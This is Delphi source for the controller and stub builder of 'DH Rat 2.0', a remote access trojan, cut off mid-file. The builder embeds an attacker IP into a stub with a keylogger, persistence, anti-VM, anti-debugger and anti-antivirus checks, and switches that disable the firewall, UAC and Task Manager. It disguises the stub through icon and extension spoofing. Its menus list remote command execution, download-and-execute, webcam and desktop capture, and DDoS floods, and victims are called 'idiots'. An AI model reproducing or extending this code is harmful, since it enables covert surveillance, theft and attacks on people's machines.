{
  This software is Copyright (c) 2016 by Doddy Hackman.
  This is free software, licensed under:
  The Artistic License 2.0
  The Artistic License
  Preamble
  This license establishes the terms under which a given free software Package may be copied, modified, distributed, and/or redistributed. The intent is that the Copyright Holder maintains some artistic control over the development of that Package while still keeping the Package available as open source and free software.
  You are always permitted to make arrangements wholly outside of this license directly with the Copyright Holder of a given Package. If the terms of this license do not permit the full use that you propose to make of the Package, you should contact the Copyright Holder and seek a different licensing arrangement.
  Definitions
  "Copyright Holder" means the individual(s) or organization(s) named in the copyright notice for the entire Package.
  "Contributor" means any party that has contributed code or other material to the Package, in accordance with the Copyright Holder's procedures.
  "You" and "your" means any person who would like to copy, distribute, or modify the Package.
  "Package" means the collection of files distributed by the Copyright Holder, and derivatives of that collection and/or of those files. A given Package may consist of either the Standard Version, or a Modified Version.
  "Distribute" means providing a copy of the Package or making it accessible to anyone else, or in the case of a company or organization, to others outside of your company or organization.
  "Distributor Fee" means any fee that you charge for Distributing this Package or providing support for this Package to another party. It does not mean licensing fees.
  "Standard Version" refers to the Package if it has not been modified, or has been modified only in ways explicitly requested by the Copyright Holder.
  "Modified Version" means the Package, if it has been changed, and such changes were not explicitly requested by the Copyright Holder.
  "Original License" means this Artistic License as Distributed with the Standard Version of the Package, in its current version or as it may be modified by The Perl Foundation in the future.
  "Source" form means the source code, documentation source, and configuration files for the Package.
  "Compiled" form means the compiled bytecode, object code, binary, or any other form resulting from mechanical transformation or translation of the Source form.
  Permission for Use and Modification Without Distribution
  (1) You are permitted to use the Standard Version and create and use Modified Versions for any purpose without restriction, provided that you do not Distribute the Modified Version.
  Permissions for Redistribution of the Standard Version
  (2) You may Distribute verbatim copies of the Source form of the Standard Version of this Package in any medium without restriction, either gratis or for a Distributor Fee, provided that you duplicate all of the original copyright notices and associated disclaimers. At your discretion, such verbatim copies may or may not include a Compiled form of the Package.
  (3) You may apply any bug fixes, portability changes, and other modifications made available from the Copyright Holder. The resulting Package will still be considered the Standard Version, and as such will be subject to the Original License.
  Distribution of Modified Versions of the Package as Source
  (4) You may Distribute your Modified Version as Source (either gratis or for a Distributor Fee, and with or without a Compiled form of the Modified Version) provided that you clearly document how it differs from the Standard Version, including, but not limited to, documenting any non-standard features, executables, or modules, and provided that you do at least ONE of the following:
  (a) make the Modified Version available to the Copyright Holder of the Standard Version, under the Original License, so that the Copyright Holder may include your modifications in the Standard Version.
  (b) ensure that installation of your Modified Version does not prevent the user installing or running the Standard Version. In addition, the Modified Version must bear a name that is different from the name of the Standard Version.
  (c) allow anyone who receives a copy of the Modified Version to make the Source form of the Modified Version available to others under
  (i) the Original License or
  (ii) a license that permits the licensee to freely copy, modify and redistribute the Modified Version using the same licensing terms that apply to the copy that the licensee received, and requires that the Source form of the Modified Version, and of any works derived from it, be made freely available in that license fees are prohibited but Distributor Fees are allowed.
  Distribution of Compiled Forms of the Standard Version or Modified Versions without the Source
  (5) You may Distribute Compiled forms of the Standard Version without the Source, provided that you include complete instructions on how to get the Source of the Standard Version. Such instructions must be valid at the time of your distribution. If these instructions, at any time while you are carrying out such distribution, become invalid, you must provide new instructions on demand or cease further distribution. If you provide valid instructions or cease distribution within thirty days after you become aware that the instructions are invalid, then you do not forfeit any of your rights under this license.
  (6) You may Distribute a Modified Version in Compiled form without the Source, provided that you comply with Section 4 with respect to the Source of the Modified Version.
  Aggregating or Linking the Package
  (7) You may aggregate the Package (either the Standard Version or Modified Version) with other packages and Distribute the resulting aggregation provided that you do not charge a licensing fee for the Package. Distributor Fees are permitted, and licensing fees for other components in the aggregation are permitted. The terms of this license apply to the use and Distribution of the Standard or Modified Versions as included in the aggregation.
  (8) You are permitted to link Modified and Standard Versions with other works, to embed the Package in a larger work of your own, or to build stand-alone binary or bytecode versions of applications that include the Package, and Distribute the result without restriction, provided the result does not expose a direct interface to the Package.
  Items That are Not Considered Part of a Modified Version
  (9) Works (including, but not limited to, modules and scripts) that merely extend or make use of the Package, do not, by themselves, cause the Package to be a Modified Version. In addition, such works are not considered parts of the Package itself, and are not subject to the terms of this license.
  General Provisions
  (10) Any use, modification, and distribution of the Standard or Modified Versions is governed by this Artistic License. By using, modifying or distributing the Package, you accept this license. Do not use, modify, or distribute the Package, if you do not accept this license.
  (11) If your Modified Version has been derived from a Modified Version made by someone other than you, you are nevertheless required to ensure that your Modified Version complies with the requirements of this license.
  (12) This license does not grant you the right to use any trademark, service mark, tradename, or logo of the Copyright Holder.
  (13) This license includes the non-exclusive, worldwide, free-of-charge patent license to make, have made, use, offer to sell, sell, import and otherwise transfer the Package with respect to any patent claims licensable by the Copyright Holder that are necessarily infringed by the Package. If you institute patent litigation (including a cross-claim or counterclaim) against any party alleging that the Package constitutes direct or contributory patent infringement, then this Artistic License to you shall terminate on the date that such litigation is filed.
  (14) Disclaimer of Warranty: THE PACKAGE IS PROVIDED BY THE COPYRIGHT HOLDER AND CONTRIBUTORS "AS IS' AND WITHOUT ANY EXPRESS OR IMPLIED WARRANTIES. THE IMPLIED WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, OR NON-INFRINGEMENT ARE DISCLAIMED TO THE EXTENT PERMITTED BY YOUR LOCAL LAW. UNLESS REQUIRED BY LAW, NO COPYRIGHT HOLDER OR CONTRIBUTOR WILL BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, OR CONSEQUENTIAL DAMAGES ARISING IN ANY WAY OUT OF THE USE OF THE PACKAGE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
}

// DH Rat 2.0
// (C) Doddy Hackman 2016

unit rat;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
  System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.Imaging.pngimage, Vcl.ExtCtrls,
  Vcl.ComCtrls, Vcl.ImgList, Vcl.StdCtrls, Vcl.Styles.Utils.ComCtrls,
  Vcl.Styles.Utils.Menus,
  Vcl.Styles.Utils.SysStyleHook,
  Vcl.Styles.Utils.SysControls, Vcl.Styles.Utils.Forms,
  Vcl.Styles.Utils.StdCtrls, Vcl.Styles.Utils.ScreenTips, DH_Form_Effects,
  DH_Builder_Tools, DH_Server_Manager, System.Win.ScktComp, IdBaseComponent,
  IdComponent, IdTCPConnection, IdTCPClient, IdHTTP, Vcl.Menus, IdCoder,
  IdCoderMIME, ShellApi, FormDesktopCapture,
  FormWebcamCapture, Jpeg, DH_Informator;

type
  TFormHome = class(TForm)
    imgLogo: TImage;
    status: TStatusBar;
    ppOpciones: TPopupMenu;
    ItemFiles: TMenuItem;
    ItemListFiles: TMenuItem;
    ItemReadFile: TMenuItem;
    ItemDeleteThisFile: TMenuItem;
    ItemProcess: TMenuItem;
    ItemListProcess: TMenuItem;
    ItemKillProcess: TMenuItem;
    ItemCommand: TMenuItem;
    ItemDisables: TMenuItem;
    ItemRegedit: TMenuItem;
    ItemActiveRegedit: TMenuItem;
    DisableRegedit: TMenuItem;
    ItemFirewall: TMenuItem;
    ItemActiveFirewall: TMenuItem;
    ItemDisableFirewall: TMenuItem;
    ItemJokes: TMenuItem;
    ItemCD: TMenuItem;
    ItemOpenCD: TMenuItem;
    ItemCloseCD: TMenuItem;
    ItemIcons: TMenuItem;
    ItemIconsShow: TMenuItem;
    ItemHideIcons: TMenuItem;
    ItemTaskbar: TMenuItem;
    ItemTaskbarShow: TMenuItem;
    ItemTaskbarHide: TMenuItem;
    ItemMessages: TMenuItem;
    ItemMessagesSingle: TMenuItem;
    ItemMessagesBomber: TMenuItem;
    ItemSendkeys: TMenuItem;
    SendKeys: TMenuItem;
    ItemWriteWord: TMenuItem;
    ItemCrazy: TMenuItem;
    ItemCrazyMouse: TMenuItem;
    ItemCrazyHour: TMenuItem;
    ItemManager: TMenuItem;
    ItemShutdown: TMenuItem;
    ItemReboot: TMenuItem;
    ItemCloseSession: TMenuItem;
    ItemOpenURL: TMenuItem;
    ItemLoadPaint: TMenuItem;
    ItemChangeTaskbarText: TMenuItem;
    ItemChangeTextTaskbarEnable: TMenuItem;
    ItemChangeTextTaskbarDisable: TMenuItem;
    ItemTurnOffMonitor: TMenuItem;
    ItemSpeak: TMenuItem;
    ItemPlayBeeps: TMenuItem;
    ItemOthers: TMenuItem;
    ItemList: TMenuItem;
    ItemListDrives: TMenuItem;
    ItemListServices: TMenuItem;
    ItemListWindows: TMenuItem;
    ItemDownloadAndExecute: TMenuItem;
    ItemScreensaver: TMenuItem;
    ItemScreensaverChange: TMenuItem;
    ItemWallpaper: TMenuItem;
    ItemWallpaperChange: TMenuItem;
    ItemBomber: TMenuItem;
    ItemPrinterBomber: TMenuItem;
    ItemFormBomber: TMenuItem;
    ItemHTMLBomber: TMenuItem;
    ItemWindowsBomber: TMenuItem;
    ItemBlockAll: TMenuItem;
    ItemDDOS: TMenuItem;
    ItemSQLI_DoS: TMenuItem;
    ItemHTTP_Flood: TMenuItem;
    ItemSocket_Flood: TMenuItem;
    ItemSlowloris: TMenuItem;
    ItemUDP_Flood: TMenuItem;
    ItemKeylogger: TMenuItem;
    ItemUninstaller: TMenuItem;
    ilIconosConsole: TImageList;
    ilIconosOpciones: TImageList;
    ilIconosMenu: TImageList;
    notificar: TTrayIcon;
    ilIconosAntis: TImageList;
    ppConsole: TPopupMenu;
    Clear1: TMenuItem;
    ilIconosPageControl: TImageList;
    ilIconosBuilder: TImageList;
    ilIconosBotones: TImageList;
    nave: TIdHTTP;
    ppMenu: TPopupMenu;
    StartServer1: TMenuItem;
    StopServer1: TMenuItem;
    ssServer: TServerSocket;
    pcOptions: TPageControl;
    tsAdministration: TTabSheet;
    idiots_found_now: TGroupBox;
    lvIdiots: TListView;
    tsConsole: TTabSheet;
    gbConsole: TGroupBox;
    console: TMemo;
    tsBuilder: TTabSheet;
    pcBuilderOptions: TPageControl;
    tsConfiguration: TTabSheet;
    gbEnterIPBuilder: TGroupBox;
    txtIP: TEdit;
    btnGenerate: TButton;
    gbOptionsConfiguration: TGroupBox;
    cbHideFiles: TCheckBox;
    cbUseStartup: TCheckBox;
    cbUseKeylogger: TCheckBox;
    tsUAC_Tricky: TTabSheet;
    cb_Use_UAC_Tricky: TCheckBox;
    gbTypeUAC_Tricky: TGroupBox;
    rbContinue_if_UAC_is_Off: TRadioButton;
    rbExit_if_UAC_is_Off: TRadioButton;
    tsExtractionPath: TTabSheet;
    gbPathExtractionPath: TGroupBox;
    cmbSpecialPaths: TComboBox;
    txtPath: TEdit;
    rbSelectPath: TRadioButton;
    rbIUseThis: TRadioButton;
    gbEnterFolderExtractionPath: TGroupBox;
    txtFolder: TEdit;
    tsDateTime: TTabSheet;
    cbUseThisDateTime: TCheckBox;
    gbDateTimeConfiguration: TGroupBox;
    lblCreationTime: TLabel;
    lblModifiedTime: TLabel;
    lblLastAccess: TLabel;
    txtCreationTime: TEdit;
    txtModifiedTime: TEdit;
    txtLastAccessTime: TEdit;
    tsFilePumper: TTabSheet;
    cbIUseFilePumper: TCheckBox;
    gbEnterCountFilePumper: TGroupBox;
    txtCount: TEdit;
    upEnterCountFilePumper: TUpDown;
    gbSelectTypeFilePumper: TGroupBox;
    cmbTypes: TComboBox;
    tsExtensionSpoofer: TTabSheet;
    cbUseExtensionSpoofer: TCheckBox;
    gbOptionsExtensionSpoofer: TGroupBox;
    cmbExtensions: TComboBox;
    rbUseSelectExtension: TRadioButton;
    rbUseThisExtension: TRadioButton;
    txtExtension: TEdit;
    tsIconChanger: TTabSheet;
    gbEnterIconIconChanger: TGroupBox;
    txtPathIcon: TEdit;
    btnLoadIcon: TButton;
    gbPreviewIconChanger: TGroupBox;
    imgPreviewIcon: TImage;
    cbUseIconChanger: TCheckBox;
    tsAntisDisables: TTabSheet;
    gbAntis: TGroupBox;
    cbAnti_VirtualPC: TCheckBox;
    cbAnti_VirtualBox: TCheckBox;
    cbAnti_Kaspersky: TCheckBox;
    cbAnti_Wireshark: TCheckBox;
    cbAnti_OllyDbg: TCheckBox;
    cbAnti_Anubis: TCheckBox;
    cbAnti_Debug: TCheckBox;
    cbAnti_VMWare: TCheckBox;
    gbDisables: TGroupBox;
    cbDisable_UAC: TCheckBox;
    cbDisable_Firewall: TCheckBox;
    cbDisable_CMD: TCheckBox;
    cbDisable_Run: TCheckBox;
    cbDisable_Regedit: TCheckBox;
    cbDisable_Taskmgr: TCheckBox;
    cbDisable_Updates: TCheckBox;
    cbDisable_MsConfig: TCheckBox;
    tsAbout: TTabSheet;
    gbAbout: TGroupBox;
    about: TImage;
    panelAbout: TPanel;
    labelAbout: TLabel;
    ItemWebcam: TMenuItem;
    ItemDesktop: TMenuItem;
    ItemStartCaptureWebcam: TMenuItem;
    ItemStopCaptureWebcam: TMenuItem;
    ItemStartCaptureDesktop: TMenuItem;
    ItemStopCaptureDesktop: TMenuItem;
    ssRemoteServer: TServerSocket;
    ilIconosIdiots: TImageList;
    procedure FormCreate(Sender: TObject);
    procedure btnGenerateClick(Sender: TObject);
    procedure StartServer1Click(Sender: TObject);
    procedure StopServer1Click(Sender: TObject);
    procedure Clear1Click(Sender: TObject);
    procedure ssServerClientRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure ssServerListen(Sender: TObject; Socket: TCustomWinSocket);
    procedure ItemListFilesClick(Sender: TObject);
    procedure ItemReadFileClick(Sender: TObject);
    procedure ItemDeleteThisFileClick(Sender: TObject);
    procedure ItemListProcessClick(Sender: TObject);
    procedure ItemKillProcessClick(Sender: TObject);
    procedure ItemCommandClick(Sender: TObject);
    procedure ItemActiveRegeditClick(Sender: TObject);
    procedure DisableRegeditClick(Sender: TObject);
    procedure ItemActiveFirewallClick(Sender: TObject);
    procedure ItemDisableFirewallClick(Sender: TObject);
    procedure ItemOpenCDClick(Sender: TObject);
    procedure ItemCloseCDClick(Sender: TObject);
    procedure ItemIconsShowClick(Sender: TObject);
    procedure ItemHideIconsClick(Sender: TObject);
    procedure ItemTaskbarShowClick(Sender: TObject);
    procedure ItemTaskbarHideClick(Sender: TObject);
    procedure ItemMessagesSingleClick(Sender: TObject);
    procedure ItemMessagesBomberClick(Sender: TObject);
    procedure SendKeysClick(Sender: TObject);
    procedure ItemWriteWordClick(Sender: TObject);
    procedure ItemCrazyMouseClick(Sender: TObject);
    procedure ItemCrazyHourClick(Sender: TObject);
    procedure ItemShutdownClick(Sender: TObject);
    procedure ItemRebootClick(Sender: TObject);
    procedure ItemCloseSessionClick(Sender: TObject);
    procedure ItemOpenURLClick(Sender: TObject);
    procedure ItemLoadPaintClick(Sender: TObject);
    procedure ItemChangeTextTaskbarEnableClick(Sender: TObject);
    procedure ItemChangeTextTaskbarDisableClick(Sender: TObject);
    procedure ItemTurnOffMonitorClick(Sender: TObject);
    procedure ItemSpeakClick(Sender: TObject);
    procedure ItemPlayBeepsClick(Sender: TObject);
    procedure ItemListDrivesClick(Sender: TObject);
    procedure ItemListServicesClick(Sender: TObject);
    procedure ItemListWindowsClick(Sender: TObject);
    procedure ItemDownloadAndExecuteClick(Sender: TObject);
    procedure ItemScreensaverChangeClick(Sender: TObject);
    procedure ItemWallpaperChangeClick(Sender: TObject);
    procedure ItemFormBomberClick(Sender: TObject);
    procedure ItemPrinterBomberClick(Sender: TObject);
    procedure ItemWindowsBomberClick(Sender: TObject);
    procedure ItemHTMLBomberClick(Sender: TObject);
    procedure ItemBlockAllClick(Sender: TObject);
    procedure ItemSQLI_DoSClick(Sender: TObject);
    procedure ItemHTTP_FloodClick(Sender: TObject);
    procedure ItemSocket_FloodClick(Sender: TObject);
    procedure ItemSlowlorisClick(Sender: TObject);
    procedure ItemUDP_FloodClick(Sender: TObject);
    procedure ItemKeyloggerClick(Sender: TObject);
    procedure ItemUninstallerClick(Sender: TObject);
    procedure ItemStartCaptureWebcamClick(Sender: TObject);
    procedure ItemStopCaptureWebcamClick(Sender: TObject);
    procedure ItemStartCaptureDesktopClick(Sender: TObject);
    procedure ItemStopCaptureDesktopClick(Sender: TObject);
    procedure ssRemoteServerClientRead(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure ssServerClientDisconnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure btnLoadIconClick(Sender: TObject);
  private
    { Private declarations }
    file_stream: TFileStream;
    file_size: integer;
    capture_online: boolean;
  public
    { Public declarations }
    frmDesktopCapture: TfrmDesktopCapture;
    frmWebcamCapture: TfrmWebcamCapture;
    desktop_online: boolean;
    webcam_online: boolean;
    username_idiot: string;
    webcam_idiot: string;
    status_idiot: string;
    function open_dialog(title, filter: string; filter_index: integer): string;
    function save_dialog(title, filter, default_ext: string;
      filter_index: integer): string;
    procedure Send_Command(Command: string);
  end;

var
  FormHome: TFormHome;
  idiots_found: integer;
  argument1: string;
  argument2: string;
  argument3: string;
  argument4: string;

implementation

{$R *.dfm}
// Functions

function message_box(title, message_text, type_message: string): string;
begin
  if not(title = '') and not(message_text = '') and not(type_message = '') then
  begin
    try
      begin
        if (type_message = 'Information') then
        begin
          MessageBox(FormHome.Handle, PChar(message_text), PChar(title),
            MB_ICONINFORMATION);
        end
        else if (type_message = 'Warning') then
        begin
          MessageBox(FormHome.Handle, PChar(message_text), PChar(title),
            MB_ICONWARNING);
        end
        else if (type_message = 'Question') then
        begin
          MessageBox(FormHome.Handle, PChar(message_text), PChar(title),
            MB_ICONQUESTION);
        end
        else if (type_message = 'Error') then
        begin
          MessageBox(FormHome.Handle, PChar(message_text), PChar(title),
            MB_ICONERROR);
        end
        else
        begin
          MessageBox(FormHome.Handle, PChar(message_text), PChar(title),
            MB_ICONINFORMATION);
        end;
        Result := '[+] MessageBox : OK';
      end;
    except
      begin
        Result := '[-] Error';
      end;
    end;
  end
  else
  begin
    Result := '[-] Error';
  end;
end;

function TFormHome.open_dialog(title, filter: string;
  filter_index: integer): string;
var
  odOpenFile: TOpenDialog;
  filename: string;
begin
  odOpenFile := TOpenDialog.Create(Self);
  odOpenFile.title := title;
  odOpenFile.InitialDir := GetCurrentDir;
  odOpenFile.Options := [ofFileMustExist];
  odOpenFile.filter := filter;
  odOpenFile.FilterIndex := filter_index;
  if odOpenFile.Execute then
  begin
    filename := odOpenFile.filename;
  end;
  odOpenFile.Free;
  Result := filename;
end;

function TFormHome.save_dialog(title, filter, default_ext: string;
  filter_index: integer): string;
var
  sdSaveFile: TSaveDialog;
  filename: string;
begin
  sdSaveFile := TSaveDialog.Create(Self);
  sdSaveFile.title := title;
  sdSaveFile.InitialDir := GetCurrentDir;
  sdSaveFile.filter := filter;
  sdSaveFile.DefaultExt := default_ext;
  sdSaveFile.FilterIndex := filter_index;
  if sdSaveFile.Execute then
  begin
    filename := sdSaveFile.filename;
  end;
  sdSaveFile.Free;
  Result := filename;
end;

function base64_encode(text: string): string;
var
  Encoder: TIdEncoderMime;
begin
  Encoder := TIdEncoderMime.Create(nil);
  try
    Result := Encoder.EncodeString(text);
  finally
    FreeAndNil(Encoder);
  end
end;

function base64_decode(text: string): string;
var
  Decoder: TIdDecoderMime;
begin
  Decoder := TIdDecoderMime.Create(nil);
  try
    Result := Decoder.DecodeString(text);
  finally
    FreeAndNil(Decoder);
  end
end;

procedure savefile(filename, texto: string);
var
  ar: TextFile;

begin

  AssignFile(ar, filename);
  FileMode := fmOpenWrite;

  if FileExists(filename) then
    Append(ar)
  else
    Rewrite(ar);

  Write(ar, texto);
  CloseFile(ar);

end;

function regex(text: String; deaca: String; hastaaca: String): String;
begin
  Delete(text, 1, AnsiPos(deaca, text) + length(deaca) - 1);
  SetLength(text, AnsiPos(hastaaca, text) - 1);
  Result := text;
end;

//

procedure TFormHome.FormCreate(Sender: TObject);
var
  effect: T_DH_Form_Effects;
var
  info: T_DH_Informator;
  ip, country, country_image, username, os, read_code: string;
var
  stream: TMemoryStream;
  png: TPngImage;
  bmp: TBitmap;
  R: TRect;
  nave_profile: TIdHTTP;
begin

  idiots_found := 0;

  effect := T_DH_Form_Effects.Create();
  effect.Effect_Marquee_Label_DownUp(panelAbout, labelAbout, 1);
  effect.Free;
  UseLatestCommonDialogs := False;
  console.Lines.Clear;
  console.Lines.Add(' - DH Rat - Command Console - ');
  console.Lines.Add('Running program version 1.0');
  console.Lines.Add('-----------------------------------' + sLineBreak);
  console.Lines.Add('Welcome to hell');

  frmDesktopCapture := TfrmDesktopCapture.Create(Self);
  frmWebcamCapture := TfrmWebcamCapture.Create(Self);

end;

procedure TFormHome.btnGenerateClick(Sender: TObject);
var
  builder_tools: T_DH_Builder_Tools;
  server_manager: T_DH_Server_Manager;
  stub_generado: string;

var
  ip: string;
  port: string;
  port_remotecapture: string;

var
  configuration, extraction_config, antis_config, disables_config,
    linea_final: string;

  //
var
  op_hide_files, op_use_startup, op_use_keylogger, op_use_special_path,
    op_i_use_this, op_use_uac_tricky, op_uac_tricky_continue_if_off,
    op_uac_tricky_exit_if_off, op_use_this_datetime, op_anti_virtual_pc,
    op_anti_virtual_box, op_anti_debug, op_anti_wireshark, op_anti_ollydbg,
    op_anti_anubis, op_anti_kaspersky, op_anti_vmware, op_disable_uac,
    op_disable_firewall, op_disable_cmd, op_disable_run, op_disable_taskmgr,
    op_disable_regedit, op_disable_updates, op_disable_msconfig: string;

  //

begin

  if (txtIP.text = '') then
  begin
    message_box('DH Rat 2.0', 'Enter Configuration', 'Warning');
  end
  else
  begin
    stub_generado := save_dialog('Save your malware', 'Exe file|*.exe',
      'exe', 0);

    ip := txtIP.text;
    port := '11666';
    port_remotecapture := '11667';

    //

    if (cbHideFiles.Checked) then
    begin
      op_hide_files := '1';
    end
    else
    begin
      op_hide_files := '0';
    end;

    if (cbUseStartup.Checked) then
    begin
      op_use_startup := '1';
    end
    else
    begin
      op_use_startup := '0';
    end;

    if (cb_Use_UAC_Tricky.Checked) then
    begin
      op_use_uac_tricky := '1';
    end
    else
    begin
      op_use_uac_tricky := '0';
    end;

    if (rbContinue_if_UAC_is_Off.Checked) then
    begin
      op_uac_tricky_continue_if_off := '1';
    end
    else
    begin
      op_uac_tricky_continue_if_off := '0';
    end;

    if (rbExit_if_UAC_is_Off.Checked) then
    begin
      op_uac_tricky_exit_if_off := '1';
    end
    else
    begin
      op_uac_tricky_exit_if_off := '0';
    end;

    if (cbUseKeylogger.Checked) then
    begin
      op_use_keylogger := '1';
    end
    else
    begin
      op_use_keylogger := '0';
    end;

    if (rbSelectPath.Checked) then
    begin
      op_use_special_path := '1';
    end
    else
    begin
      op_use_special_path := '0';
    end;

    if (rbIUseThis.Checked) then
    begin
      op_i_use_this := '1';
    end
    else
    begin
      op_i_use_this := '0';
    end;

    if (cbUseThisDateTime.Checked) then
    begin
      op_use_this_datetime := '1';
    end
    else
    begin
      op_use_this_datetime := '0';
    end;

    if (cbAnti_VirtualPC.Checked) then
    begin
      op_anti_virtual_pc := '1';
    end
    else
    begin
      op_anti_virtual_pc := '0';
    end;

    if (cbAnti_VirtualBox.Checked) then
    begin
      op_anti_virtual_box := '1';
    end
    else
    begin
      op_anti_virtual_box := '0';
    end;

    if (cbAnti_Debug.Checked) then
    begin
      op_anti_debug := '1';
    end
    else
    begin
      op_anti_debug := '0';
    end;

    if (cbAnti_Wireshark.Checked) then
    begin
      op_anti_wireshark := '1';
    end
    else
    begin
      op_anti_wireshark := '0';
    end;

    if (cbAnti_OllyDbg.Checked) then
    begin
      op_anti_ollydbg := '1';
    end
    else
    begin
      op_anti_ollydbg := '0';
    end;

    if (cbAnti_Anubis.Checked) then
    begin
      op_anti_anubis := '1';
    end
    else
    begin
      op_anti_anubis := '0';
    end;

    if (cbAnti_Kaspersky.Checked) then
    begin
      op_anti_kaspersky := '1';
    end
    else
    begin
      op_anti_kaspersky := '0';
    end;

    if (cbAnti_VMWare.Checked) then
    begin
      op_anti_vmware := '1';
    end
    else
    begin
      op_anti_vmware := '0';
    end;

    if (cbDisable_UAC.Checked) then
    begin
      op_disable_uac := '1';
    end
    else
    begin
      op_disable_uac := '0';
    end;

    if (cbDisable_Firewall.Checked) then
    begin
      op_disable_firewall := '1';
    end
    else
    begin
      op_disable_firewall := '0';
    end;

    if (cbDisable_CMD.Checked) then
    begin
      op_disable_cmd := '1';
    end
    else
    begin
      op_disable_cmd := '0';
    end;

    if (cbDisable_Run.Checked) then
    begin
      op_disable_run := '1';
    end
    else
    begin
      op_disable_run := '0';
    end;

    if (cbDisable_Taskmgr.Checked) then
    begin
      op_disable_taskmgr := '1';
    end
    else
    begin
      op_disable_taskmgr := '0';
    end;

    if (cbDisable_Regedit.Checked) then
    begin
      op_disable_regedit := '1';
    end
    else
    begin
      op_disable_regedit := '0';
    end;

    if (cbDisable_Updates.Checked) then
    begin
      op_disable_updates := '1';
    end
    else
    begin
      op_disable_updates := '0';
    end;

    if (cbDisable_MsConfig.Checked) then
    begin
      op_disable_msconfig := '1';
    end
    else
    begin
      op_disable_msconfig := '0';
    end;

    //

    configuration := '[ip]' + txtIP.text + '[ip]' + '[port_server]' + port +
      '[port_server][port_remotecapture]' + port_remotecapture +
      '[port_remotecapture]';

    configuration := configuration + '[active]1[active][op_hide_files]' +
      op_hide_files + '[op_hide_files]' + '[op_use_startup]' + op_use_startup +
      '[op_use_startup]' + '[op_keylogger]' + op_use_keylogger +
      '[op_keylogger]';
    extraction_config := '[op_use_special_path]' + op_use_special_path +
      '[op_use_special_path]' + '[op_use_this_path]' + op_i_use_this +
      '[op_use_this_path]' + '[special_path]' + cmbSpecialPaths.text +
      '[special_path]' + '[path]' + txtPath.text + '[path]' + '[folder]' +
      txtFolder.text + '[folder]' + '[op_use_uac_tricky]' + op_use_uac_tricky +
      '[op_use_uac_tricky][op_uac_tricky_continue_if_off]' +
      op_uac_tricky_continue_if_off + '[op_uac_tricky_continue_if_off]' +
      '[op_uac_tricky_exit_if_off]' + op_uac_tricky_exit_if_off +
      '[op_uac_tricky_exit_if_off][op_use_this_datetime]' + op_use_this_datetime
      + '[op_use_this_datetime][creation_time]' + txtCreationTime.text +
      '[creation_time][modified_time]' + txtModifiedTime.text +
      '[modified_time][last_access]' + txtLastAccessTime.text + '[last_access]';

    antis_config := '[op_anti_virtual_pc]' + op_anti_virtual_pc +
      '[op_anti_virtual_pc]' + '[op_anti_virtual_box]' + op_anti_virtual_box +
      '[op_anti_virtual_box]' + '[op_anti_debug]' + op_anti_debug +
      '[op_anti_debug]' + '[op_anti_wireshark]' + op_anti_wireshark +
      '[op_anti_wireshark]' + '[op_anti_ollydbg]' + op_anti_ollydbg +
      '[op_anti_ollydbg]' + '[op_anti_anubis]' + op_anti_anubis +
      '[op_anti_anubis]' + '[op_anti_kaspersky]' + op_anti_kaspersky +
      '[op_anti_kaspersky]' + '[op_anti_vmware]' + op_anti_vmware +
      '[op_anti_vmware]';

    disables_config := '[op_disable_uac]' + op_disable_uac + '[op_disable_uac]'
      + '[op_disable_firewall]' + op_disable_firewall + '[op_disable_firewall]'
      + '[op_disable_cmd]' + op_disable_cmd + '[op_disable_cmd]' +
      '[op_disable_run]' + op_disable_run + '[op_disable_run]' +
      '[op_disable_taskmgr]' + op_disable_taskmgr + '[op_disable_taskmgr]' +
      '[op_disable_regedit]' + op_disable_regedit + '[op_disable_regedit]' +
      '[op_disable_updates]' + op_disable_updates + '[op_disable_updates]' +
      '[op_disable_msconfig]' + op_disable_msconfig + '[op_disable_msconfig]';

    linea_final := configuration + extraction_config + antis_config +
      disables_config;

    DeleteFile(stub_generado);
    CopyFile(PChar(ExtractFilePath(Application.ExeName) + '/' + 'stub_now.exe'),
      PChar(stub_generado), True);

    builder_tools := T_DH_Builder_Tools.Create();
    server_manager := T_DH_Server_Manager.Create();

    if (builder_tools.write_resource(stub_generado, linea_final, 666)) then
    begin

      if (cbIUseFilePumper.Checked) then
      begin
        if (server_manager.file_pumper(stub_generado, txtCount.text,
          cmbTypes.text)) then
        begin
          status.Panels[0].text := '[+] File Pumper';
          status.Update;
        end
        else
        begin
          status.Panels[0].text := '[-] Error with File Pumper';
          status.Update;
        end;
      end;

      if (cbUseIconChanger.Checked) then
      begin
        if (server_manager.change_icon(stub_generado, txtPathIcon.text)) then
        begin
          status.Panels[0].text := '[+] Icon Changed';
          status.Update;
        end
        else
        begin
          status.Panels[0].text := '[-] Error with Icon Changer';
          status.Update;
        end;
      end;

      if (cbUseExtensionSpoofer.Checked) then
      begin
        if (rbUseSelectExtension.Checked) then
        begin
          if (server_manager.extension_changer(stub_generado,
            cmbExtensions.text)) then
          begin
            status.Panels[0].text := '[+] Extension Changed';
            status.Update;
          end
          else
          begin
            status.Panels[0].text := '[-] Error with Extension Changer';
            status.Update;
          end;
        end;
        if (rbUseThisExtension.Checked) then
        begin
          if (server_manager.extension_changer(stub_generado, txtExtension.text))
          then
          begin
            status.Panels[0].text := '[+] Extension Changed';
            status.Update;
          end
          else
          begin
            status.Panels[0].text := '[-] Error with Extension Changer';
            status.Update;
          end;
        end;
      end;

      status.Panels[0].text := '[+] Done';
      status.Update;

      message_box('DH Rat 2.0', 'Stub Generated', 'Information');

    end
    else
    begin
      message_box('DH Rat 2.0', 'Error generating stub', 'Error');
    end;

    builder_tools.Free;
    server_manager.Free;
  end;

end;

procedure TFormHome.btnLoadIconClick(Sender: TObject);
var
  icon_loaded: string;
begin
  icon_loaded := open_dialog('Select Icon', 'Icon file|*.ico', 0);
  if not(icon_loaded = '') then
  begin
    txtPathIcon.text := icon_loaded;
    imgPreviewIcon.Picture.LoadFromFile(icon_loaded);
    message_box('DH Rat 2.0', 'Icon loaded', 'Information');
  end
  else
  begin
    message_box('DH Rat 2.0', 'Icon not found', 'Warning');
  end;
end;

procedure TFormHome.Clear1Click(Sender: TObject);
begin
  console.Lines.Clear;
  console.Lines.Add(' - DH Rat - Command Console - ');
